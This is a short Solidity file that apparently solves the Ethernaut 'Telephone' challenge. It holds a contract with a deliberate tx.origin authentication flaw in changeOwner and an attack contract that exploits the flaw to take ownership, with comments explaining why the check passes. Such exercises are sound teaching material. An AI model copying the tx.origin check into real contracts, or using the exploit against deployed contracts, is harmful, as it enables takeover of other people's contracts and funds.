// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Telephoneattack{
    Telephone t;
    constructor(address _t){
        t=Telephone(_t);
    }

    function attack() external{
    t.changeOwner(tx.origin);
    }
}
//we need to pass the (tx.origin != msg.sender) check
//we can pass this check by calling the changeOwner from another contract
//tx.origin is always a external owned account 
//so msg.sender=address of Telephoneattack contract
//tx.origin = address of the EOA attackere or who calls the attack function